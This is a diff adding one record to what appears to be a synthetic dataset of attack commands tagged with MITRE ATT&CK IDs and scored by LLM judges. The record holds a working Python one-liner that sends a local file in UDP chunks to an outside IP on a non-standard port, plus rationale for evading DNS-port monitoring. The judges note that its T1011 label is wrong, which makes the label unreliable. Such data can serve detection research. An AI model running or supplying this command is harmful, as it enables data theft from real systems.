@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket,uuid; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); addr=(\"203.0.113.200\", 53530); tid=str(uuid.uuid4()).encode(); d=open(\"/Users/Shared/.dmp\",\"rb\").read(); [ s.sendto(tid+b\"|\"+d[i:i+500], addr) for i in range(0,len(d),500) ]; s.close()'",
+  "explanation": "Chunks data into UUID-tagged UDP datagrams to a high, non-standard port, simulating a DNS-like alternate medium without using the common DNS port, aligning with T1011.",
+  "rationale_steps": [
+    "Open a UDP socket and choose a non-standard high port (53530) to avoid 53.",
+    "Tag each chunk with a transaction ID to reassemble remotely.",
+    "Use UDP as an alternate medium distinct from primary C2 channels.",
+    "No obfuscation; user-space only."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-022e3e02",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is perfectly well-formed with balanced quotes, parentheses, and brackets, proper imports, valid syntax for socket creation, list comprehension, and file operations.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over UDP which aligns with the exfiltration aspect, it doesn't actually modify system images or firmware as described in T1011 (Modify System Image), but instead appears to implement an exfiltration technique more aligned with T1048 (Exfiltration Over Alternative Protocol).",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T19:56:25.951125Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is perfectly well-formed with balanced quotes, parentheses, and correct syntax for module imports, variable assignments, file operations, and list comprehension for sending UDP packets.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command successfully performs UUID-tagged UDP data exfiltration to a non-standard port as described, it entirely fails to align with MITRE ATT&CK T1011 (Modify System Image), as its action is data transmission, not modification of an OS/firmware image.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T19:56:48.021156Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is well-formed with balanced quotes, valid imports, proper socket usage, and correct list comprehension syntax.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs UDP-based data exfiltration, not modification of a system/firmware image or bootloader as described for the technique, so it is not aligned with the provided T1011 description.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T19:57:06.749719Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 3.5,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
